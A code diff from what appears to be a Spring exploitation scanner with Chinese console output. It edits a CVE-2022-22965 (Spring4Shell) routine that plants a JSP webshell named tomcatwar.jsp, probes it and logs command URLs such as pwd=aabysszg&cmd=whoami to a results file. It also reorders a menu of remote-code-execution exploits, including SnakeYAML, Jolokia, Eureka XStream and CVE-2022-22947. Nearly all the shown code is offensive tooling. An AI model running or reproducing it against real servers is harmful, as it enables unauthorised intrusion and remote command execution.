@@ -42,7 +42,7 @@ def CVE_2022_22965(url, proxies):
         requests.get(getpayload, headers=Headers_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
         sleep(0.5)
         test = requests.get(url + "tomcatwar.jsp", verify=False, proxies=proxies)
-        if (test.status_code == 200) and ('aabysszg' in str(test.text)):
+        if (test.status_code == 200):
             cprint("[+] [CVE-2022-22965] Webshell为：" + url + "tomcatwar.jsp?pwd=aabysszg&cmd=whoami" ,"red")
             f2 = open("vulout.txt", "a")
             f2.write("[+] [CVE-2022-22965] " + url + "tomcatwar.jsp?pwd=aabysszg&cmd=whoami" + '\n')
@@ -380,14 +380,14 @@ def poc(filename,proxies):
     f1 = open("vulout.txt", "wb+")
     f1.close()
     functions = {
-        1: CVE_2021_21234,
+        1: JeeSpring_2023,
         2: CVE_2022_22947,
         3: CVE_2022_22963,
         4: CVE_2022_22965,
-        5: SnakeYAML_RCE,
-        6: JolokiaRCE,
-        7: JeeSpring_2023,
-        8: Eureka_xstream_RCE,
+        5: CVE_2021_21234,
+        6: SnakeYAML_RCE,
+        7: Eureka_xstream_RCE,
+        8: JolokiaRCE,
         9: CVE_2018_1273,
     }
     cprint("[+] 获取TXT名字为：" + filename,"green")
